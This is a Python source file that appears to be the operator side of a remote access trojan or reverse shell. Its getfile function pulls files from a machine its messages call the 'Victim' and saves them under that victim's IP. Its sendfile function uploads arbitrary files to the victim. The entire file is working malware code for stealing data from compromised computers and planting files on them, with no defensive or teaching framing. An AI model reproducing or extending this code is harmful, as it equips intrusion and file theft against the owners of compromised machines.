import os



def getfile(conn,cmd,ip):
    filepath=cmd.split(" ")[1]
    conn.send('capture'.encode())
    l=int(conn.recv(20480).decode())
    if l==0:
        print("Error in extracting file from Victim")
        conn.send("Error".encode())
    else:
        print("Extracting file")
        conn.send("start".encode())
        filename=os.path.basename(filepath)
        f=open(os.path.join(ip,filename),"wb")
        curr_len=0
        while curr_len<l:
            print(end="\r")
            data=conn.recv(204800)
            curr_len+=len(data)
            f.write(data)
            print("Transfer Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")


        f.close()
        print("\nFile Successfully Extracted from Victim")
        conn.send("done".encode())

    output=conn.recv(20480).decode()
    print(output,end="")


def sendfile(conn,cmd):
    filepath=cmd.split(" ")[1]
    try:
        f=open(filepath,"rb")
        data=f.read()
        print("Sending File to Victim")
        l=len(data)
        conn.send(str(l).encode())
        res=conn.recv(2048)
        conn.send(data)
        curr_len=0
        while curr_len<l:
            print(end="\r")
            x=int(conn.recv(20480).decode())
            curr_len+=x
            print("Transfer Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")


        print("\nFile Successfully sent to Victim: ")
        conn.send("done".encode())
        f.close()
    except:
        print("Error sending file to Victim ")
        conn.send("0".encode())

    output=conn.recv(20480).decode()
    print(output,end="")
